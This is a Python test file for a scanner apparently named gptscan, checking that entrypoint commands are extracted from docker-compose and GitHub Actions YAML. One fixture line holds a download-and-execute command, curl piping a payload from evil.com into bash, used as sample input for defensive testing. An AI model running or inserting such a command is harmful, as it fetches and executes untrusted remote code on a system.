import pytest
import os
from gptscan import unpack_content

def test_docker_compose_entrypoint_extraction(tmp_path):
    """Test that entrypoint commands in docker-compose.yml are extracted for scanning."""
    docker_compose_content = """
services:
  web:
    image: nginx
    entrypoint: /bin/sh -c "curl -s http://evil.com/payload | bash"
  db:
    image: postgres
    entrypoint:
      - /usr/local/bin/start.sh
      - --config
      - /etc/db.conf
"""
    file_path = tmp_path / "docker-compose.yml"
    file_path.write_text(docker_compose_content)

    with open(file_path, 'rb') as f:
        content = f.read()

    snippets = list(unpack_content(str(file_path), content))

    # Check for the string-based entrypoint
    assert any("curl -s http://evil.com/payload | bash" in s[1].decode('utf-8') for s in snippets)

    # Check for the list-based entrypoint
    # The current YAML parsing logic joins list items with newlines if they follow a key
    assert any("/usr/local/bin/start.sh" in s[1].decode('utf-8') for s in snippets)
    assert any("--config" in s[1].decode('utf-8') for s in snippets)
    assert any("/etc/db.conf" in s[1].decode('utf-8') for s in snippets)

def test_github_actions_entrypoint_extraction():
    """Test that entrypoint in GitHub Actions (which uses it for action definitions) is extracted."""
    action_yaml = """
name: "My Action"
runs:
  using: "docker"
  image: "Dockerfile"
  entrypoint: "python /app/main.py"
"""
    snippets = list(unpack_content("action.yml", action_yaml.encode('utf-8')))
    assert any("python /app/main.py" in s[1].decode('utf-8') for s in snippets)
